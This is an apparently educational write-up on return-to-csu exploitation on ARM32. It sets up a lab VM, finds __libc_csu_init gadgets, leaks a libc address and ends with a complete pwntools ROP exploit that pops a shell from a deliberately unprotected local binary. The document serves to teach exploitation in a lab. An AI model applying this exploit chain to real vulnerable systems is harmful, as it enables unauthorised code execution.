# **return-to-csu on ARM32**

## **Environment Setup**

To set up an environment for exploitation, we have used a ready made virtual machine named ARM Lab VM 2.0, which is made available by Azeria Labs [1]. The virtual machine can be downloaded from the following link [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/). This Lab VM contains [2]:

- Qemu [3] emulated ARMv7 environment.
- Useful tools like GEF [4] and Ropper [5] which are already installed in the ARMv7 environment.

After downloading, the password for extracting the downloaded zip file is &quot;azerialabs&quot;. When the files will be extracted, you can open the virtual machine instance in vmware player [6] which is free or vmware workstation pro which is paid. We are using vmware workstation pro for running this virtual machine instance. After starting the instance, you will see the following screen in front of you.

![](https://github.com/xetrapwn/xetrapwn.github.io/blob/master/images/return-to-csu_on_ARM32/figure01.png)

Fig 1 - ARM Lab VM 2.0

In the fig 1, you can see the blue arm processor icon on the left of the screen. After clicking on it, the ARMv7 Qemu instance will start. After the booting process, the machine will ask for username and password which is &quot;user&quot; and &quot;user&quot; respectively. The logged in screen is shown in fig 2. 

![](https://github.com/xetrapwn/xetrapwn.github.io/blob/master/images/return-to-csu_on_ARM32/figure02.png)

Fig 2 - ARMv7 Qemu instance

For the smooth exploitation and debugging process, we have used a terminator terminal emulator which gives us the features of screen division using keyboard shortcut keys and many other tweeks [7]. 

![](https://github.com/xetrapwn/xetrapwn.github.io/blob/master/images/return-to-csu_on_ARM32/figure03.png)

Fig 3 - ssh connection of ARM instance to use on terminator terminal emulator

By using the &quot;_ssh arm_&quot; command, we got the ssh connection to the ARM Qemu instance. We divided the terminal into two tabs and did ssh on both of them because we will use one for debugging and the other for exploit writing side by side. All of this setup is shown in fig 3.

Now the next step is to install pwntools [8], which is a CTF (Capture the Flag [9]) framework and exploit development library. This library will make our exploit writing a way more easier and effective. To install the pwntools on debian based Linux distributions, one can use the following commands [10].

`_$ apt-get update_`

`_$ apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential_`

`_$ python3 -m pip install --upgrade pip_`

`_$ python3 -m pip install --upgrade pwntools_`

Instructions are available on their installation guide to install pwntools in other Linux platforms [10].

This is it for the environment setup, now let&#39;s dive into the exploitation part.


## **Bypassing NX and ASLR using ret2csu**

In this section, we will write an exploit to bypass the NX (no execute) bit and ASLR (Address Space Layout Randomization) which are two mitigations for buffer overflow vulnerability. These mitigations are thoroughly explained in section 2.8 of chapter 2. But let&#39;s briefly talk about them again.

The NX bit [11] is an exploit mitigation technique against buffer overflow which makes a certain area of a memory non executable. If the NX bit is set then the classical buffer overflow exploit will not work which uses shell code to execute on the stack. But researchers found a new technique which is called return oriented programming (ROP) [12] to exploit buffer overflow while the NX bit is on. In this technique the chunk of assembly instructions which are called gadgets are used to perform the same malicious operations which were previously performed by shellcode in the classical exploit.

The ASLR is another exploit mitigation technique which randomizes the stack, heap and library (libc, ld, etc) sections of the executable, but it does not randomize the main binary sections (.text, .plt, .got, .rodata, etc). It makes various exploit techniques like return to libc difficult to work. An exploit writer cannot directly call the &quot;system&quot; or &quot;execve&quot; because their addresses will be randomized. This forced security researchers to become more creative and find some technique to overcome this mitigation. The technique that we are going to use is one of them. We can enable or disable ASLR by editing the file named &quot;randomize\_va\_space&quot; in the directory &quot;/proc/sys/kernel/&quot;. By putting &quot;0&quot; into it, the ASLR will be off. By putting 1, the ASLR will be turned on but the heap will not be randomized, and by putting 2 the ASLR will also randomize the heap [13].

The vulnerable code which we will be using is shown in Fig 4. We will compile it using -fno-stack-protector and --no-pie flags so that mitigations of PIE and canary will not be present in the binary. We will also put 2 in randomize\_va\_space file to enable ASLR.

![](https://github.com/xetrapwn/xetrapwn.github.io/blob/master/images/return-to-csu_on_ARM32/figure04.png)

Fig 4 - Vulnerable code

Now let&#39;s start writing exploit. The technique which we are going to use is return to csu [14]. In this technique we will use a function called \_\_libc\_csu\_init from our binary which will be used to create a generic ROP chain to leak information. This function is added automatically after compiling the code, so our ROP chain will be always available.

### **Preparing for Exploit Creation**

There are two ROP gadgets that will be used in our exploit payload. These gadgets are shown in the following disassembly of \_\_libc\_csu\_init.

![](https://github.com/xetrapwn/xetrapwn.github.io/blob/master/images/return-to-csu_on_ARM32/figure05.png)

Fig 5 - disassembly of \_\_libc\_csu\_init

The first gadget is at the address 0x0001049e and the second gadget is starting from 0x00010492 and ending at 0x00010498. These gadgets are generic or universal because by using them we can populate three arguments by using r7, r8 and r9 which are later filled into the argument registers r0, r1, and r2. And we can also call both of the gadgets in the chain to call multiple functions.

Our exploit will be divided into two phases. The first phase will leak the address of write@GOT by calling write@plt. And the second phase will call the system by using the offsetting with leaked write address.

![](https://github.com/xetrapwn/xetrapwn.github.io/blob/master/images/return-to-csu_on_ARM32/figure06.png)

Fig 6 - ROP chains

The first phase is represented by payload 1 in Fig 6 and the second phase is represented by payload 2. For the creation of the first payload, first we need to add a bunch of A&#39;s to reach the return address. After that the address of the first gadget is written so that it can be called in place of the return address. Now we have to populate r3, r4, r5, r6, r7, r8 and r9, and the registers r7, r8 and r9 are crucial because they will be moved into r0, r1, and r2 respectively which will become arguments for the write function. After the address of the first gadget, the address of write@plt is written which will be popped into r3 and it will be called in the second gadget. Next three zeros are filled into r4, r5 and r6. The reason for doing this is that we have to skip the branch instruction at 0x0001049c so that we can run gadget one automatically after gadget two which will facilitate us in keeping our program alive by calling main again. After writing zeros, the three arguments are written which will be popped in r7, r8 and r9 respectively. Here we are trying to call &quot;write(1, write@got, 0x4)&quot; which will write the address of the write function in GOT on STDOUT so that we can get the randomized address of the libc function. After that we have written the address of the second gadget so that it can be popped into the pc register. The second gadget will populate the argument registers and call the write function. After writing the address on STDOUT, registers r6 and r4 are compared to jump to the instruction 32. We have already put zero in r6 and r4 so the branch will not be done and the first gadget will start executing. This time the stack is filled with 7 zero words to fill zeros in all registers and after these zeros the address of the main function is written which will be popped into pc. This is done so that the program does not terminate because the addresses are randomized on every execution and our leak will be of no use. After completion of this payload we will have our leak, which can be used to find the actual addresses of the system and /bin/sh. First we will find the offset between system and write function and after that this offset will be added or subtracted from the leaked write address to find the actual address of the system. The same procedure will be used to find the address of /bin/sh. After finding these addresses we will use them in our second payload.

The second payload is started with the same junk which is used in the first payload. After that the address of the first gadget is written so that it will be executed instead of the return address. Then the address of the system is written which we have calculated, this will be popped into r3 which will be branched in the second gadget. Now we only need to fill r7 with the address of /bin/sh string so that it can be used as the first argument. After filling all the registers with appropriate values the address of the second gadget is written so that it can be popped in the pc register and the system will execute in the second gadget. After execution of both of these payloads, a shell will be popped.

### **Exploit Creation**

For creation of the first payload, let&#39;s first find the address of both gadgets. These gadgets can be easily found by disassembling the \_\_libc\_csu\_init function just like done in fig 5. After doing that we can note the addresses of both gadgets.

`_gadget1 = 0x0001049e_`

`_gadget2 = 0x00010492_`

Now to find the address of write@plt, we can disassemble the main function and note the address as shown in fig 7.

![](https://github.com/xetrapwn/xetrapwn.github.io/blob/master/images/return-to-csu_on_ARM32/figure07.png)

Fig 7 - Disassembly of main function

`_write@plt = 0x1035c_`

Now to find the address of write@got, we can use the gef command $got which prints out the function names and their addresses from the global offset table. In fig 8, we can see the address 0x2101c where the write@GLIBC address will be written. 

![](https://github.com/xetrapwn/xetrapwn.github.io/blob/master/images/return-to-csu_on_ARM32/figure08.png)

Fig 8 - to find the address of write@got

`_write@got = 0x2101c_`

Now only the address of the main function is left to complete our payload, which we can easily get from fig 7.

`_main = 0x10434_`

All the addresses we need for the payload one are successfully found. Following is the first phase of our exploit. 

![](https://github.com/xetrapwn/xetrapwn.github.io/blob/master/images/return-to-csu_on_ARM32/figure09.png)

Fig 9 - First phase of exploit

After running the first phase, we have successfully got our leak. Now the next step is to find the actual addresses of the system and /bin/sh by using this leak. To do this first we need to find the addresses of write@GLIBC and system@GLIBC as done in fig 10 so that we can find the difference between them. This difference will give us the offset of the system from the write function. 

![](https://github.com/xetrapwn/xetrapwn.github.io/blob/master/images/return-to-csu_on_ARM32/figure10.png)

Fig 10 - base addresses of system and write functions

`_system\_offset = 0x60910_`

The same is done for /bin/sh. Both addresses of /bin/sh and write are printed as shown in fig 11 and then their difference gives us the offset. 

![](https://github.com/xetrapwn/xetrapwn.github.io/blob/master/images/return-to-csu_on_ARM32/figure11.png)

Fig 11 - base addresses of /bin/sh and write functions

`_binsh\_offset = 0x49814_`

Now we just need to add or subtract them with a leaked write address to find the real addresses.

`_system = (leaked\_write - system\_offset)_`

`_binsh = (leaked\_write + binsh\_offset)_`

The system offset is subtracted because the system function was above the write function. And similarly, /bin/sh offset is added because the write function was above /bin/sh.

All the addresses we need for the payload two are successfully found. Following is the second phase of our exploit.

![](https://github.com/xetrapwn/xetrapwn.github.io/blob/master/images/return-to-csu_on_ARM32/figure12.png)

Fig 12 - Second phase of exploit

### **Complete Exploit**

The complete exploit will look something like this.

_#!/usr/bin/env python3_

_from pwn import \*_

_p = process(&#39;bof&#39;)_

_e = ELF(&#39;bof&#39;)_

_#### Phase 01 - Leaking address of write function_

_# gadgets in \_\_libc\_csu\_init_

_# 0x00010492 \&lt;+38\&gt;: mov r2, r9_

_# 0x00010494 \&lt;+40\&gt;: mov r1, r8_

_# 0x00010496 \&lt;+42\&gt;: mov r0, r7_

_# 0x00010498 \&lt;+44\&gt;: blx r3_

_# 0x0001049a \&lt;+46\&gt;: cmp r6, r4_

_# 0x0001049c \&lt;+48\&gt;: bne.n 0x1048c \&lt;\_\_libc\_csu\_init+32\&gt;_

_# 0x0001049e \&lt;+50\&gt;: ldmia.w sp!, {r3, r4, r5, r6, r7, r8, r9, pc}_

_junk = b&#39;A&#39;\*104_

_gadget1 = 0x0001049e + 1 # one is added to convert in thumb mode_

_gadget2 = 0x00010492 + 1_

_write\_plt = 0x0001035c # write@plt taken from main_

_write\_got = e.got[&#39;write&#39;] # write@got_

_main = 0x10434 + 1 # starting address of main_

_# first rop chain to leak write@GLIBC_

_payload1 = junk_

_payload1 += p32(gadget1)_

_payload1 += p32(write\_plt)_

_payload1 += p32(0x0)_

_payload1 += p32(0x0)_

_payload1 += p32(0x0)_

_payload1 += p32(0x1)_

_payload1 += p32(write\_got)_

_payload1 += p32(0x4)_

_payload1 += p32(gadget2)_

_payload1 += p32(0x0)_

_payload1 += p32(0x0)_

_payload1 += p32(0x0)_

_payload1 += p32(0x0)_

_payload1 += p32(0x0)_

_payload1 += p32(0x0)_

_payload1 += p32(0x0)_

_payload1 += p32(main)_

_p.recvuntil(&quot;pwn me\n&quot;)_

_p.sendline(payload1)_

_file = open(&quot;payload1.bin&quot;, &quot;wb&quot;) # For debugging purposes_

_file.write(payload1)_

_file.close()_

_leaked\_write = u32(p.recv().strip()[-10:-6])_

_log.success(&#39;Leaked write@GLIBC: &#39; + hex(leaked\_write))_

_#### Phase 02 - Calling System_

_system\_offset = 0x60910 # difference between write and system address_

_binsh\_offset = 0x49814 # difference between write and /bin/sh address_

_system = (leaked\_write - system\_offset) # to get the randomized address of system_

_log.success(&#39;Leaked system@GLIBC: &#39; + hex(system))_

_binsh = (leaked\_write + binsh\_offset) - 1 # to get the randomized address of /bin/sh_

_log.success(&#39;Leaked /bin/sh: &#39; + hex(binsh)) # 1 is subtracted to convert in thumb mode_

_# second rop chain to call system_

_payload2 = junk_

_payload2 += p32(gadget1)_

_payload2 += p32(system)_

_payload2 += p32(0x0)_

_payload2 += p32(0x0)_

_payload2 += p32(0x0)_

_payload2 += p32(binsh)_

_payload2 += p32(0x0)_

_payload2 += p32(0x0)_

_payload2 += p32(gadget2)_

_p.sendline(payload2)_

_p.recv()_

_p.interactive()_

### **Running Exploit**

After running this exploit, we got the shell! 

![](https://github.com/xetrapwn/xetrapwn.github.io/blob/master/images/return-to-csu_on_ARM32/figure13.png)

Fig 13 - Running exploit

### **References**

[1] &quot;Azeria Labs.&quot;[https://azeria-labs.com/](https://azeria-labs.com/) (accessed Jun. 06, 2021).

[2] &quot;Lab VM 2.0,&quot; _Azeria-Labs_.[https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/) (accessed Jun. 06, 2021).

[3] &quot;QEMU.&quot;[https://www.qemu.org/](https://www.qemu.org/) (accessed Jun. 06, 2021).

[4] &quot;Home - GEF - GDB Enhanced Features documentation.&quot;[https://gef.readthedocs.io/en/master/](https://gef.readthedocs.io/en/master/) (accessed Jun. 06, 2021).

[5] S. Schirra, _sashs/Ropper_. 2021. Accessed: Jun. 06, 2021. [Online]. Available:[https://github.com/sashs/Ropper](https://github.com/sashs/Ropper)

[6] &quot;Workstation Player : Run a Second, Isolated Operating System on a Single PC with VMware Workstation Player,&quot; _VMware_.[https://www.vmware.com/products/workstation-player.html](https://www.vmware.com/products/workstation-player.html) (accessed Jun. 06, 2021).

[7] &quot;Welcome to Terminator&#39;s documentation! — Terminator 2.0 alpha documentation.&quot;[https://terminator-gtk3.readthedocs.io/en/latest/](https://terminator-gtk3.readthedocs.io/en/latest/) (accessed Jun. 06, 2021).

[8] &quot;pwntools — pwntools 4.5.1 documentation.&quot;[https://docs.pwntools.com/en/stable/](https://docs.pwntools.com/en/stable/) (accessed Jun. 07, 2021).

[9] &quot;CTFtime.org / All about CTF (Capture The Flag).&quot;[https://ctftime.org/](https://ctftime.org/) (accessed Jun. 07, 2021).

[10] &quot;Installation — pwntools 4.5.1 documentation.&quot;[https://docs.pwntools.com/en/stable/install.html](https://docs.pwntools.com/en/stable/install.html) (accessed Jun. 07, 2021).

[11] A. Daniele, B. Patrizio, and D. Basso Luca, &quot;NX bit A hardware-enforced BOF protection.&quot; [Online]. Available:[http://index-of.es/EBooks/NX-bit.pdf](http://index-of.es/EBooks/NX-bit.pdf).

[12] Prandini, Marco, and Marco Ramilli. &quot;Return-oriented programming.&quot; _IEEE Security &amp; Privacy_ 10.6 (2012): 84-87.

[13] M. Boelen, &quot;Linux and ASLR: kernel/randomize\_va\_space - Linux Audit.&quot;[https://linux-audit.com/linux-aslr-and-kernelrandomize\_va\_space-setting/](https://linux-audit.com/linux-aslr-and-kernelrandomize_va_space-setting/) (accessed Jun. 07, 2021).

[14] H. Marco-Gisbert and I. Ripoll-Ripoll, &quot;return-to-csu: A New Method to Bypass 64-bit Linux ASLR.&quot; Black Hat Asia, 2018.
